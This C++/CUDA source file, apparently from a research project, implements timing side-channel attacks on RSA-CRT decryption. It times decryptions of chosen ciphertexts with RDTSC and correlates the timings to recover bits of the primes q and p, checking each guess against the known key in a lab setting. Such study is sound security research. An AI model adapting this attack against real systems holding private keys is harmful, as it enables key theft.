/* Class RSAAttack code 
 * 3/10/2017
 */
#include <fstream>
#include <stdexcept>
#include <cstring>
#include <stdio.h>
using namespace std;

#include <cuda_runtime.h>
#include <helper_cuda.h>
#include <curand.h>
#include <openssl/bn.h>
#include <openssl/rsa.h>

#include "RSAAttack.h"
#include "RSABase.h"
#include "rsa_cpu.hh"
#include "rsa_gpu.hh"
#include "tanc.hh"

#define checkCurandErrors(x) do { curandStatus_t status= (x);\
	if (status != CURAND_STATUS_SUCCESS) { \
	printf("Error %d at %s:%d\n", status, __FILE__, __LINE__); \
	exit(EXIT_FAILURE);}} while(0)

RSAAttack::RSAAttack(int traceNum_, int seed_, SW_Type swType, const char *fileName, int keyBits_)
	:RSAGPUAttack(traceNum_, 1, seed_, swType, fileName, keyBits_){
	hostMsg = new WORD[traceNum * keySize];
	checkCudaErrors(cudaMemcpy(hostMsg, deviceMsg, traceNum * keyBytes, cudaMemcpyDeviceToHost));
}

RSAAttack::~RSAAttack() {
    // Free memory
    delete [] hostMsg;
}

void RSAAttack::timeDecrypt(const char *fileName) {
	// Open file for writing
	ofstream dataFile(fileName, ios::binary | ios::out);
	if (!dataFile)
		throw runtime_error("Could not open file for time recording");

	uint64_t begin, end;
	uint64_t *timeInfo = new uint64_t[traceNum];
	WORD *ret = new WORD[keySize]; // Hold result;
	WORD *msg_; // Start of next msg
	for (int i = 0; i < traceNum; i++) {
		msg_ = hostMsg + i * keySize;
		RDTSC_START(begin);
		for (int j = 0; j < 10; j++)
			msgMontExpCPU(ret, msg_, swType);
		RDTSC_STOP(end);
		timeInfo[i] = end - begin;
	}
	// Save timeInfo into file
	dataFile.write((const char*)timeInfo, traceNum * sizeof(uint64_t));
	dataFile.close();
	// Free memory
	delete [] ret;
    delete [] timeInfo;
}

void RSAAttack::attackCRT(int windowSize) {

	unsigned char *ctext_m0 = new unsigned char [keyBytes];
	unsigned char *ctext_m1 = new unsigned char [keyBytes];
	unsigned char *dtext_m = new unsigned char [keyBytes];

	RSA *rsa = key.getRSA();
	int key_bits = key.getKeyBits();

	BIGNUM *bn_r, *bn_rp, *bn_g, *bn_g0, *bn_g1, *bn_gir0, *bn_gir1;
	BN_CTX *bn_ctx;
	bn_ctx = BN_CTX_new();
	bn_r = BN_new();
	bn_rp = BN_new();
	bn_g = BN_new();
	bn_g0 = BN_new();
	bn_g1 = BN_new();
	bn_gir0 = BN_new();
	bn_gir1 = BN_new();

	BN_set_bit(bn_r, key_bits/2);
	BN_mod_inverse(bn_rp, bn_r, rsa->n, bn_ctx);

	BN_zero(bn_g);
	BN_set_bit(bn_g, key_bits/2-1);
	BN_set_bit(bn_g, key_bits/2-2);

	uint64_t time0, time1;
	uint64_t begin, end;
	uint64_t threshold; 

	int repeat_num = 8;
	int success = 0;
	int failure = 0;

	for(int i=253; i>=0; i--) {
		/* g[i] = 0 */
		BN_copy(bn_g0, bn_g);
		/* g[i] = 1 */
		BN_copy(bn_g1, bn_g);
		BN_set_bit(bn_g1, i);
		time0 = 0;
		time1 = 0;
		for(int j=0; j<windowSize; j++) {
			BN_add_word(bn_g0, 1);
			BN_add_word(bn_g1, 1);
			BN_mod_mul(bn_gir0, bn_g0, bn_rp, rsa->n, bn_ctx);
			BN_mod_mul(bn_gir1, bn_g1, bn_rp, rsa->n, bn_ctx);
			int zero_num = keyBytes - BN_num_bytes(bn_gir0);
			memset(ctext_m0, 0, keyBytes);
			memset(ctext_m1, 0, keyBytes);
			BN_bn2bin(bn_gir0, ctext_m0 + zero_num);
			BN_bn2bin(bn_gir1, ctext_m1 + zero_num);
			for(int k=0; k<repeat_num; k++) {
				RDTSC_START(begin);
				privateDecryptCRT(ctext_m1, dtext_m);
				RDTSC_STOP(end);
				time1 += end - begin;
	
				RDTSC_START(begin);
				privateDecryptCRT(ctext_m0, dtext_m);
				RDTSC_STOP(end);
				time0 += end - begin;
			}
		}
		int gbitSet = 0;
		int qbitSet = BN_is_bit_set(rsa->q, i);
		threshold = time0 / 300;
		if (time1 > time0 - threshold)
			gbitSet = 1;
		printf("bit %d of q %d, g %d\n", i, qbitSet, gbitSet);
		printf("time0 = %lu, time1 = %lu, diff = %+8ld, threshold = %ld.  ",
			time0, time1, time1-time0 + threshold, threshold);
		if (gbitSet == qbitSet) {
			success++;
			printf("\n");
		}
		else {
			failure++;
			printf("Failure\n");
		}

		if (qbitSet)
			BN_set_bit(bn_g, i);
	}
	printf("Succss rate %3d/%3d = %f\n", success, failure + success, float(success)/(success + failure));


	/* Clear memory */
	delete [] ctext_m0;
	delete [] ctext_m1;
	delete [] dtext_m;

	BN_free(bn_r);
	BN_free(bn_rp);
	BN_free(bn_g);
	BN_CTX_free(bn_ctx);
	BN_free(bn_g0);
	BN_free(bn_g1);
	BN_free(bn_gir0);
	BN_free(bn_gir1);

}

void RSAAttack::timeCRT(const char* fileName) {
	// Create output file stream
	ofstream dataFile(fileName, ios::binary | ios::out);
	if (!dataFile)
		throw runtime_error("Could not open file for timing CRT");
	
	uint64_t begin, end;
	uint64_t *timeInfo = new uint64_t[traceNum];
	unsigned char *ret = new unsigned char[keyBytes];
	unsigned char *msg_ = (unsigned char *) hostMsg; // Start of nex msg
	
	for (int i = 0; i < traceNum; i++) {
		RDTSC_START(begin);
		for (int j = 0; j < 10; j++) {
			privateDecryptCRT(msg_, ret);
		}
		RDTSC_STOP(end);
		timeInfo[i] = end - begin;
		msg_ += keyBytes;
	}
	
	dataFile.write((const char*)timeInfo, traceNum * sizeof(uint64_t));
	dataFile.close();

	delete [] ret;
	delete [] timeInfo;
}

/* Calculate (msg * r mod q), transform the result into uint64_t
 * input -> bn -> bn = bn * r mod n -> bn = bn mod p 
 */
static void msgModBN(uint64_t *output, const unsigned char *input, BIGNUM *p, BIGNUM *n,
	int traceNum, int msgBits) {
	BIGNUM *bTemp = BN_new();
	BIGNUM *r = BN_new();
	BN_set_bit(r, msgBits / 2);
	BN_CTX *bn_ctx = BN_CTX_new();
	BIGNUM *p_63 = BN_new();  // using 63 to avoid overflow
	BN_rshift(p_63, p, 63);
	int msgBytes = msgBits / 8;

	for (int i = 0; i < traceNum; i++) {
		BN_bin2bn(input + i * msgBytes, msgBytes, bTemp);
		BN_mul(bTemp, bTemp, r, bn_ctx);
		BN_nnmod(bTemp, bTemp, n, bn_ctx);
		BN_nnmod(bTemp, bTemp, p, bn_ctx);
		BN_div(bTemp, NULL, bTemp, p_63, bn_ctx);
		// set output[i] to zero
		output[i] = 0;
		BN_bn2bin(bTemp, (unsigned char *)(output + i));
		RSABase::msgEndiannessSwitch((unsigned char *)(output + i), 1, BN_num_bytes(bTemp));
	}

	// Free memory
	BN_free(bTemp);
	BN_free(r);
	BN_CTX_free(bn_ctx);
	BN_free(p_63);
}

void RSAAttack::attackCRTRandom(const char *fileName) {
	// Load timing data
	uint64_t *timeInfo = new uint64_t[traceNum];
	msgModBN(timeInfo, (unsigned char*)hostMsg, key.rsa.p, key.rsa.n, traceNum, key.keyBits);
	/*ifstream dataFile(fileName, ios::binary | ios::in);
	if (!dataFile) throw runtime_error("Could not open file for reading.");
	dataFile.read((char *)timeInfo, traceNum * sizeof(uint64_t));
	dataFile.close();*/

	/* Attack from MSB to LSB, assume the first bit is 1.
	*/
	BIGNUM *pBase = BN_new();
	BN_set_bit(pBase, key.keyBits/2 - 1);
	BIGNUM *p0 = BN_new();
	BIGNUM *p1 = BN_new();
	uint64_t *time0 = new uint64_t[traceNum];
	uint64_t *time1 = new uint64_t[traceNum];
	double corrResult[2];
	uint64_t *time[] = {time0, time1};
	int success = 0;
	int failure = 0;
	for (int i = key.keyBits / 2 - 2; i > 0; i--) {
		// set p0 = xxxx01000...
		BN_copy(p0, pBase);
		BN_set_bit(p0, i - 1);
		// set p1 = xxxx11000...
		BN_copy(p1, pBase);
		BN_set_bit(p1, i);
		BN_set_bit(p1, i - 1);

		msgModBN(time0, (unsigned char*)hostMsg, p0, key.rsa.n, traceNum, key.keyBits);
		msgModBN(time1, (unsigned char*)hostMsg, p1, key.rsa.n, traceNum, key.keyBits);
		// Correlation
		corr(corrResult, timeInfo, time, 2, traceNum);

		int pBit = BN_is_bit_set(key.rsa.p, i);
		int gBit = (corrResult[1] > corrResult[0]);

		printf("%3d: pBit = %d, gBit = %d, corr0 = %+.5f, corr1 = %+.5f.", 
			i, pBit, gBit, corrResult[0], corrResult[1]);
		if (pBit == gBit) {
			printf("\n");
			success++;
		}
		else {
			printf("Wrong \n");
			failure++;
		}

		// Set pBase
		if (pBit) BN_set_bit(pBase, i);

	}

	printf("Success rate %d/%d = %f\n", success, (success+failure), double(success)/(success+failure));

	// Free memory
	BN_free(pBase);
	BN_free(p0);
	BN_free(p1);
	delete [] timeInfo;
	delete [] time0;
	delete [] time1;
}

